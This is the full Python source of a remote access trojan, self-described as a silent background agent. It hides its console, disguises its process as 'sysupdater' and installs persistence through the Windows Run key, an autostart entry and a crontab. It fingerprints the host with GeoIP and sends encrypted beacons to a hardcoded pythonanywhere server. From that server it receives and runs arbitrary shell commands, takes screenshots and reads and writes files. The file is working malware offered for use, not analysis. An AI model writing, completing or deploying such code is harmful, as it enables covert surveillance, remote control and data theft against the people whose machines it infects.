#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SDF Ghost Client - Complete Silent Background Agent
Auto-installs all required libraries before use
No console output, runs as 'sysupdater'
All features including GeoIP, screenshots, file operations
"""

import os
import sys
import subprocess
import importlib
import pkg_resources
from pathlib import Path

# ==============================================================================
# AUTO-INSTALL DEPENDENCIES - COMPLETELY SILENT
# ==============================================================================

REQUIRED_PACKAGES = [
    'psutil',
    'cryptography',
    'Pillow',
    'requests'
]

# Optional packages (try to install but don't fail if not available)
OPTIONAL_PACKAGES = [
    'pyscreenshot',
    'pypiwin32; sys_platform == "win32"'
]

def silent_install(package):
    """Install package silently - no output"""
    try:
        subprocess.run(
            [sys.executable, '-m', 'pip', 'install', '--quiet', package, '--break-system-packages'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False
        )
        return True
    except:
        return False

def ensure_packages():
    """Check and install required packages silently"""
    installed = {pkg.key for pkg in pkg_resources.working_set}
    
    for package in REQUIRED_PACKAGES:
        pkg_name = package.split(';')[0].strip()
        pkg_key = pkg_name.lower().replace('-', '_')
        
        # Check if already installed
        try:
            pkg_resources.get_distribution(pkg_name)
            continue
        except pkg_resources.DistributionNotFound:
            pass
        
        # Install silently
        silent_install(package)
    
    # Try optional packages
    for package in OPTIONAL_PACKAGES:
        pkg_name = package.split(';')[0].strip()
        try:
            pkg_resources.get_distribution(pkg_name)
        except:
            silent_install(package)

# Run dependency installation BEFORE anything else
ensure_packages()

# ==============================================================================
# NOW IMPORT ALL DEPENDENCIES
# ==============================================================================

import json
import base64
import time
import socket
import platform
import tempfile
import random
import string
import threading
import hashlib
import hmac
from datetime import datetime
from urllib import request, error
from pathlib import Path

# ==============================================================================
# STEALTH CONFIGURATION - COMPLETELY SILENT
# ==============================================================================

# Hide everything - no output, no logs, no traces
HIDE_CONSOLE = True
DISABLE_LOGGING = True

# System task name (shows in task manager as sysupdater)
TASK_NAME = "sysupdater"

# Paths - hidden and random
CONFIG_PATH = Path.home() / '.cache' / 'sysupdate' / 'config.json'
CACHE_DIR = Path.home() / '.cache' / 'sysupdate'
MUTEX_NAME = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

# Server configuration
BASE_URL = 'https://securitydienetforces.pythonanywhere.com'
AES_KEY = base64.b64decode('AdqYcTHmoqWNYLMpwp9DD7ApmHKXF0VoPlt+DKyNGEY=')

# ==============================================================================
# COMPLETE OUTPUT SUPPRESSION
# ==============================================================================

# Redirect all output to null
class NullWriter:
    def write(self, *args, **kwargs):
        pass
    def flush(self, *args, **kwargs):
        pass
    def close(self, *args, **kwargs):
        pass

# Silence everything
if HIDE_CONSOLE:
    sys.stdout = NullWriter()
    sys.stderr = NullWriter()
    
    # Also silence stderr for subprocess
    os.environ['PYTHONWARNINGS'] = 'ignore'
    os.environ['PYTHONUNBUFFERED'] = '1'

# ==============================================================================
# SILENT IMPORTS WITH FALLBACKS
# ==============================================================================

try:
    import psutil
    HAS_PSUTIL = True
except:
    HAS_PSUTIL = False

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTO = True
except:
    HAS_CRYPTO = False

try:
    from PIL import ImageGrab, Image
    HAS_PIL = True
except:
    HAS_PIL = False

try:
    import pyscreenshot
    HAS_PYSCREENSHOT = True
except:
    HAS_PYSCREENSHOT = False

# ==============================================================================
# SINGLE INSTANCE MUTEX
# ==============================================================================

class SingleInstance:
    """Prevent multiple instances running"""
    def __init__(self):
        self.lock_file = Path(tempfile.gettempdir()) / f'.{MUTEX_NAME}.lock'
        self.pid = os.getpid()
        self.held = False
        
    def acquire(self):
        try:
            if self.lock_file.exists():
                try:
                    with open(self.lock_file, 'r') as f:
                        old_pid = int(f.read().strip())
                    # Check if process is still running
                    if platform.system() == 'Windows':
                        result = subprocess.run(['tasklist', '/FI', f'PID eq {old_pid}'], 
                                               capture_output=True, text=True)
                        if str(old_pid) in result.stdout:
                            return False
                    else:
                        try:
                            os.kill(old_pid, 0)
                            return False
                        except:
                            pass
                except:
                    pass
                self.lock_file.unlink()
            
            with open(self.lock_file, 'w') as f:
                f.write(str(self.pid))
            self.held = True
            return True
        except:
            return False
    
    def release(self):
        if self.held and self.lock_file.exists():
            try:
                self.lock_file.unlink()
            except:
                pass

# ==============================================================================
# SILENT CRYPTOGRAPHY
# ==============================================================================

class Crypto:
    @staticmethod
    def encrypt(data: dict) -> str:
        try:
            if not HAS_CRYPTO:
                return base64.b64encode(json.dumps(data).encode()).decode()
            iv = os.urandom(12)
            cipher = AESGCM(AES_KEY)
            ciphertext = cipher.encrypt(iv, json.dumps(data).encode(), None)
            return base64.b64encode(iv + ciphertext).decode()
        except:
            return base64.b64encode(json.dumps(data).encode()).decode()

    @staticmethod
    def decrypt(token: str):
        try:
            if not HAS_CRYPTO:
                return json.loads(base64.b64decode(token))
            raw = base64.b64decode(token)
            if len(raw) < 12:
                return None
            iv, ciphertext = raw[:12], raw[12:]
            plaintext = AESGCM(AES_KEY).decrypt(iv, ciphertext, None)
            return json.loads(plaintext)
        except:
            return None

# ==============================================================================
# SYSTEM INFORMATION WITH GEOIP
# ==============================================================================

class SystemInfo:
    @staticmethod
    def get_hostname():
        try:
            return socket.gethostname()
        except:
            return 'localhost'

    @staticmethod
    def get_machine_id():
        try:
            if platform.system() == 'Windows':
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
                return winreg.QueryValueEx(key, "MachineGuid")[0]
            elif platform.system() == 'Linux':
                for path in ['/etc/machine-id', '/var/lib/dbus/machine-id']:
                    try:
                        with open(path, 'r') as f:
                            return f.read().strip()
                    except:
                        continue
            elif platform.system() == 'Darwin':
                try:
                    return subprocess.check_output(['ioreg', '-rd1', '-c', 'IOPlatformExpertDevice']).decode().split('IOPlatformUUID')[1].split('"')[1].strip()
                except:
                    pass
        except:
            pass
        return socket.gethostname()

    @staticmethod
    def get_ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'

    @staticmethod
    def get_mac():
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
            return mac
        except:
            return '00:00:00:00:00:00'

    @staticmethod
    def get_os_info():
        try:
            system = platform.system()
            if system == 'Windows':
                import winreg
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                return winreg.QueryValueEx(key, "ProductName")[0]
            elif system == 'Linux':
                with open('/etc/os-release', 'r') as f:
                    for line in f:
                        if line.startswith('PRETTY_NAME='):
                            return line.split('=')[1].strip().strip('"')
            elif system == 'Darwin':
                return subprocess.check_output(['sw_vers', '-productName', '-productVersion']).decode().strip()
            return f"{system} {platform.release()}"
        except:
            return platform.system() or 'Unknown'

    @staticmethod
    def get_geoip(ip=None):
        """Get GeoIP information silently"""
        try:
            if ip is None:
                ip = SystemInfo.get_ip()
            if ip in ('127.0.0.1', 'localhost', ''):
                return None
            
            url = f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,lat,lon,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
            req = request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with request.urlopen(req, timeout=3) as resp:
                data = json.loads(resp.read())
                if data.get('status') == 'success':
                    return {
                        'lat': data.get('lat', 0),
                        'lon': data.get('lon', 0),
                        'city': data.get('city', ''),
                        'country': data.get('country', ''),
                        'country_code': data.get('countryCode', ''),
                        'region': data.get('region', ''),
                        'region_name': data.get('regionName', ''),
                        'isp': data.get('isp', ''),
                        'org': data.get('org', ''),
                        'as': data.get('as', ''),
                        'asname': data.get('asname', ''),
                        'mobile': data.get('mobile', False),
                        'proxy': data.get('proxy', False),
                        'hosting': data.get('hosting', False)
                    }
        except:
            pass
        return None

    @staticmethod
    def get_cpu_info():
        if not HAS_PSUTIL:
            return {'percent': 0, 'cores': 0}
        try:
            return {
                'percent': psutil.cpu_percent(interval=0.3),
                'cores': psutil.cpu_count()
            }
        except:
            return {'percent': 0, 'cores': 0}

    @staticmethod
    def get_memory_info():
        if not HAS_PSUTIL:
            return {'total': 0, 'percent': 0, 'free': 0}
        try:
            mem = psutil.virtual_memory()
            return {
                'total': mem.total,
                'percent': mem.percent,
                'free': mem.free
            }
        except:
            return {'total': 0, 'percent': 0, 'free': 0}

    @staticmethod
    def get_disk_info():
        if not HAS_PSUTIL:
            return {'total': 0, 'free': 0, 'percent': 0}
        try:
            disk = psutil.disk_usage('/')
            return {
                'total': disk.total,
                'free': disk.free,
                'percent': disk.percent
            }
        except:
            return {'total': 0, 'free': 0, 'percent': 0}

    @staticmethod
    def get_all_info():
        ip = SystemInfo.get_ip()
        geo = SystemInfo.get_geoip(ip)
        
        info = {
            'hostname': SystemInfo.get_hostname(),
            'machine_id': SystemInfo.get_machine_id(),
            'mac': SystemInfo.get_mac(),
            'ip': ip,
            'os_type': SystemInfo.get_os_info(),
            'cpu_percent': SystemInfo.get_cpu_info()['percent'],
            'ram_percent': SystemInfo.get_memory_info()['percent'],
            'disk_percent': SystemInfo.get_disk_info()['percent'],
            'disk_total': SystemInfo.get_disk_info()['total'],
            'disk_free': SystemInfo.get_disk_info()['free']
        }
        
        if geo:
            info['lat'] = geo.get('lat', 0)
            info['lon'] = geo.get('lon', 0)
            info['city'] = geo.get('city', '')
            info['country'] = geo.get('country', '')
            info['country_code'] = geo.get('country_code', '')
            info['isp'] = geo.get('isp', '')
            info['hosting'] = geo.get('hosting', False)
            
        return info

# ==============================================================================
# FILE OPERATIONS - SILENT
# ==============================================================================

class FileOps:
    @staticmethod
    def list_directory(path):
        try:
            items = []
            p = Path(path)
            if not p.exists():
                return items

            for item in sorted(p.iterdir())[:200]:
                try:
                    stat = item.stat()
                    items.append({
                        'name': item.name,
                        'path': str(item),
                        'is_dir': item.is_dir(),
                        'size': stat.st_size if not item.is_dir() else 0,
                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                    })
                except:
                    continue
            return items
        except:
            return []

    @staticmethod
    def read_file_b64(path):
        try:
            with open(path, 'rb') as f:
                return base64.b64encode(f.read()).decode()
        except:
            return None

    @staticmethod
    def write_file_b64(path, data_b64):
        try:
            data = base64.b64decode(data_b64)
            p = Path(path)
            p.parent.mkdir(parents=True, exist_ok=True)
            with open(path, 'wb') as f:
                f.write(data)
            return True
        except:
            return False

# ==============================================================================
# SCREEN CAPTURE - COMPLETELY SILENT
# ==============================================================================

class ScreenCapture:
    @staticmethod
    def capture():
        try:
            # Try PIL
            if HAS_PIL:
                try:
                    import io
                    img = ImageGrab.grab()
                    buffered = io.BytesIO()
                    img.save(buffered, format="JPEG", quality=60)
                    return base64.b64encode(buffered.getvalue()).decode()
                except:
                    pass
            
            # Try pyscreenshot
            if HAS_PYSCREENSHOT:
                try:
                    import io
                    img = pyscreenshot.grab()
                    buffered = io.BytesIO()
                    img.save(buffered, format="JPEG", quality=60)
                    return base64.b64encode(buffered.getvalue()).decode()
                except:
                    pass
            
            # Windows native
            if platform.system() == 'Windows':
                try:
                    import win32gui, win32ui, win32con
                    from PIL import Image
                    import io
                    
                    hwnd = win32gui.GetDesktopWindow()
                    left, top, right, bottom = win32gui.GetWindowRect(hwnd)
                    w, h = right - left, bottom - top

                    hwnd_dc = win32gui.GetWindowDC(hwnd)
                    mfc_dc = win32ui.CreateDCFromHandle(hwnd_dc)
                    save_dc = mfc_dc.CreateCompatibleDC()

                    bitmap = win32ui.CreateBitmap()
                    bitmap.CreateCompatibleBitmap(mfc_dc, w, h)
                    save_dc.SelectObject(bitmap)
                    save_dc.BitBlt((0, 0), (w, h), mfc_dc, (0, 0), win32con.SRCCOPY)

                    bmpinfo = bitmap.GetInfo()
                    bmpstr = bitmap.GetBitmapBits(True)

                    img = Image.frombuffer('RGB', (bmpinfo['bmWidth'], bmpinfo['bmHeight']), bmpstr, 'raw', 'BGRX', 0, 1)
                    buffered = io.BytesIO()
                    img.save(buffered, format="JPEG", quality=60)
                    return base64.b64encode(buffered.getvalue()).decode()
                except:
                    pass
                    
        except:
            pass
        return None

# ==============================================================================
# COMMAND EXECUTOR - COMPLETELY SILENT
# ==============================================================================

class CommandExecutor:
    @staticmethod
    def execute(cmd):
        try:
            # Built-in commands
            if cmd in ('screenshot', 'snapshot'):
                img = ScreenCapture.capture()
                if img:
                    return {'type': cmd, 'data': img}
                return {'type': 'error', 'data': 'Failed'}

            if cmd.startswith('cd '):
                try:
                    path = cmd[3:].strip()
                    if path == '~' or path == '':
                        path = str(Path.home())
                    os.chdir(path)
                    return {'type': 'cmd_result', 'output': os.getcwd()}
                except:
                    return {'type': 'cmd_result', 'output': 'cd failed'}

            if cmd == 'pwd':
                return {'type': 'cmd_result', 'output': os.getcwd()}

            if cmd in ('ls', 'dir'):
                try:
                    items = FileOps.list_directory(os.getcwd())
                    dirs = [i for i in items if i['is_dir']]
                    files = [i for i in items if not i['is_dir']]
                    output = f"{len(dirs)} dirs, {len(files)} files\n"
                    for i in items[:20]:
                        output += f"{'D' if i['is_dir'] else 'F'} {i['name']}\n"
                    return {'type': 'cmd_result', 'output': output[:5000]}
                except:
                    return {'type': 'cmd_result', 'output': 'ls failed'}

            if cmd.startswith('cat '):
                try:
                    path = cmd[4:].strip()
                    with open(path, 'r', errors='ignore') as f:
                        content = f.read()[:10000]
                    return {'type': 'cmd_result', 'output': content}
                except:
                    return {'type': 'cmd_result', 'output': 'cat failed'}

            if cmd == 'whoami':
                return {'type': 'cmd_result', 'output': os.getlogin()}

            if cmd == 'sysinfo':
                info = SystemInfo.get_all_info()
                return {'type': 'cmd_result', 'output': json.dumps(info, indent=2)[:10000]}

            # Execute arbitrary command - completely silent
            if platform.system() == 'Windows':
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, 
                                       timeout=30, startupinfo=startupinfo)
            else:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, 
                                       timeout=30, executable='/bin/bash')

            output = result.stdout
            if result.stderr:
                output += "\n" + result.stderr
            if not output:
                output = "OK"

            return {'type': 'cmd_result', 'output': output[:50000]}

        except:
            return {'type': 'cmd_result', 'output': 'Command failed'}

# ==============================================================================
# GHOST CLIENT - MAIN ENGINE
# ==============================================================================

class GhostClient:
    def __init__(self):
        self.hostname = SystemInfo.get_hostname()
        self.machine_id = SystemInfo.get_machine_id()
        self.running = False
        self.interval = 30
        self.retry_count = 0
        
        # Create hidden config directory
        CACHE_DIR.mkdir(parents=True, exist_ok=True)
        self.load_config()

    def load_config(self):
        try:
            if CONFIG_PATH.exists():
                with open(CONFIG_PATH, 'r') as f:
                    config = json.load(f)
                    self.interval = config.get('interval', 30)
                    self.hostname = config.get('hostname', self.hostname)
        except:
            pass

    def save_config(self):
        try:
            with open(CONFIG_PATH, 'w') as f:
                json.dump({
                    'interval': self.interval,
                    'hostname': self.hostname,
                    'machine_id': self.machine_id,
                    'last_update': datetime.now().isoformat()
                }, f)
        except:
            pass

    def collect_payload(self):
        info = SystemInfo.get_all_info()
        current_dir = os.getcwd()
        
        payload = {
            'hostname': self.hostname,
            'machine_id': self.machine_id,
            'mac': info.get('mac', ''),
            'ip': info.get('ip', ''),
            'os_type': info.get('os_type', ''),
            'cpu_percent': info.get('cpu_percent', 0),
            'ram_percent': info.get('ram_percent', 0),
            'disk_percent': info.get('disk_percent', 0),
            'disk_total': info.get('disk_total', 0),
            'disk_free': info.get('disk_free', 0),
            'file_list_path': current_dir,
            'file_list': FileOps.list_directory(current_dir)[:100],
            'timestamp': datetime.now().isoformat()
        }
        
        # GeoIP data
        if 'lat' in info:
            payload['lat'] = info['lat']
            payload['lon'] = info['lon']
            payload['city'] = info.get('city', '')
            payload['country'] = info.get('country', '')
            payload['country_code'] = info.get('country_code', '')
            payload['isp'] = info.get('isp', '')
            
        return payload

    def send_ping(self, payload=None):
        try:
            if payload is None:
                payload = self.collect_payload()

            encrypted = Crypto.encrypt(payload)
            
            req = request.Request(
                f"{BASE_URL}/api/ping",
                data=encrypted.encode(),
                headers={
                    'Content-Type': 'application/octet-stream',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )
            
            with request.urlopen(req, timeout=30) as resp:
                if resp.status == 200:
                    data = json.loads(resp.read())
                    if 'enc' in data:
                        decrypted = Crypto.decrypt(data['enc'])
                        if decrypted:
                            self.process_response(decrypted)
                            self.retry_count = 0
                            return True
            return False
        except:
            return False

    def process_response(self, response):
        try:
            status = response.get('status', '')
            
            if status == 'die':
                self.running = False
                return

            # Execute commands
            commands = response.get('cmds', [])
            for cmd in commands:
                result = CommandExecutor.execute(cmd)
                
                if result:
                    result_payload = {
                        'hostname': self.hostname,
                        'cmd': cmd,
                        'output': result.get('output', '')[:50000]
                    }
                    
                    if result.get('type') in ('screenshot', 'snapshot'):
                        if result.get('data'):
                            key = 'screen_b64' if result['type'] == 'screenshot' else 'snapshot_b64'
                            result_payload[key] = result['data']
                    
                    try:
                        encrypted = Crypto.encrypt(result_payload)
                        req = request.Request(
                            f"{BASE_URL}/api/ping",
                            data=encrypted.encode(),
                            headers={'Content-Type': 'application/octet-stream'}
                        )
                        request.urlopen(req, timeout=30)
                    except:
                        pass

            # Handle upload
            upload = response.get('upload')
            if upload:
                dest = upload.get('dest_path')
                data_b64 = upload.get('data_b64')
                if dest and data_b64:
                    FileOps.write_file_b64(dest, data_b64)
        except:
            pass

    def run(self):
        # Ensure single instance
        mutex = SingleInstance()
        if not mutex.acquire():
            return  # Another instance already running
        
        self.running = True
        self.save_config()
        
        # Main loop - completely silent
        while self.running:
            try:
                if self.send_ping():
                    time.sleep(self.interval)
                else:
                    self.retry_count += 1
                    wait = min(30 * self.retry_count, 300)
                    time.sleep(wait)
                    if self.retry_count >= 10:
                        self.retry_count = 0
            except:
                time.sleep(60)
        
        mutex.release()

# ==============================================================================
# AUTO-START / PERSISTENCE
# ==============================================================================

def setup_persistence():
    """Auto-start on system boot - completely silent"""
    try:
        if platform.system() == 'Windows':
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, TASK_NAME, 0, winreg.REG_SZ, f'"{sys.executable}" "{__file__}"')
            winreg.CloseKey(key)
        else:
            # Linux/macOS - create .desktop or cron
            desktop_dir = Path.home() / '.config' / 'autostart'
            desktop_dir.mkdir(parents=True, exist_ok=True)
            desktop_file = desktop_dir / f'{TASK_NAME}.desktop'
            
            desktop_content = f'''[Desktop Entry]
Type=Application
Name={TASK_NAME}
Exec={sys.executable} "{__file__}"
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
'''
            with open(desktop_file, 'w') as f:
                f.write(desktop_content)
            
            # Also add to crontab for redundancy
            try:
                cron_file = Path(tempfile.gettempdir()) / 'cronjob.txt'
                with open(cron_file, 'w') as f:
                    f.write(f'@reboot {sys.executable} "{__file__}" >/dev/null 2>&1\n')
                subprocess.run(['crontab', cron_file], capture_output=True)
                cron_file.unlink()
            except:
                pass
    except:
        pass

# ==============================================================================
# ENTRY POINT - NO ARGUMENTS, COMPLETELY AUTO
# ==============================================================================

if __name__ == '__main__':
    try:
        # Set process name to sysupdater
        try:
            if platform.system() != 'Windows':
                import ctypes
                ctypes.CDLL(None).prctl(15, TASK_NAME.encode(), 0, 0, 0)  # PR_SET_NAME
        except:
            pass
        
        # Setup auto-start (only once)
        try:
            flag_file = CACHE_DIR / '.installed'
            if not flag_file.exists():
                setup_persistence()
                with open(flag_file, 'w') as f:
                    f.write('1')
        except:
            pass
        
        # Start ghost client
        client = GhostClient()
        client.run()
        
    except:
        pass  # Complete silence - never show any error
